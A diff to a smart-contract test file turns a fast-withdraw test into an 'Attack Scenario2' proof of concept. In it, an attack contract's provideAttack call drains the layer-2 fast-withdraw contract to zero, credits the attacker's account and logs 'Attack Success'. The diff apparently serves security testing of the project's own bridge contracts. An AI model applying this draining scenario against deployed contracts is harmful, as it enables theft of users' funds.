@@ -365,7 +365,7 @@ describe("8.AttackScenario1", function () {
     })
   });
 
-  describe("FW Test", () => {
+  describe("Attack Scenario2", () => {
     it("if dont have TON, get TON", async () => {
       let l2NativeTokenBalance = await l2NativeTokenContract.balanceOf(
         l1Wallet.address
@@ -451,16 +451,15 @@ describe("8.AttackScenario1", function () {
       beforel2BalanceUser1 = await l2user1.getBalance()
     })
 
-    it("providerFW(TON) in L1(Failed at layer 2)", async () => {
-      const providerApproveTx = await l2NativeTokenContract.connect(l1user1).approve(L1FastWithdrawContract.address, twoETH)
-      await providerApproveTx.wait()
+    it("attack providerFW(TON)", async () => {
+      // const providerApproveTx = await l2NativeTokenContract.connect(l1user1).approve(L1FastWithdrawContract.address, twoETH)
+      // await providerApproveTx.wait()
     
       const saleCount = await L2FastWithdrawProxy.salecount()
 
-      const providerTx = await L1FastWithdrawContract.connect(l1user1).provideFW(
-        l2NativeToken,
+      const providerTx = await attackContract.connect(l1user1).provideAttack(
         l2Wallet.address,
-        oneETH,
+        twoETH,
         saleCount,
         200000
       )
@@ -483,18 +482,18 @@ describe("8.AttackScenario1", function () {
       let afterl2BalanceWallet = await l2Wallet.getBalance()
       let afterl2BalanceUser1 = await l2user1.getBalance()
 
-      expect(afterl2NativeTokenBalanceWallet).to.be.gt(beforel2NativeTokenBalanceWallet)
-      expect(beforel2NativeTokenBalanceUser).to.be.gt(afterl2NativeTokenBalanceUser)
+      expect(afterl2NativeTokenBalanceWallet).to.be.equal(beforel2NativeTokenBalanceWallet)
+      expect(beforel2NativeTokenBalanceUser).to.be.equal(afterl2NativeTokenBalanceUser)
 
       expect(beforel2BalanceWallet).to.be.equal(afterl2BalanceWallet)
-      expect(beforel2BalanceUser1).to.be.equal(afterl2BalanceUser1)
+      expect(afterl2BalanceUser1).to.be.gt(beforel2BalanceUser1)
 
       let L2FastWithdrawBalance = await l2Provider.getBalance(L2FastWithdrawContract.address)
-      expect(L2FastWithdrawBalance).to.be.equal(threeETH)
+      expect(L2FastWithdrawBalance).to.be.equal(0)
 
       const saleCount = await L2FastWithdrawProxy.salecount()
       let saleInformation = await L2FastWithdrawContract.dealData(saleCount)
-      if(saleInformation.provider !== zeroAddr){
+      if(saleInformation.provider === l2user1.address){
         console.log("===========Attack Success!!===========")
       }
     })
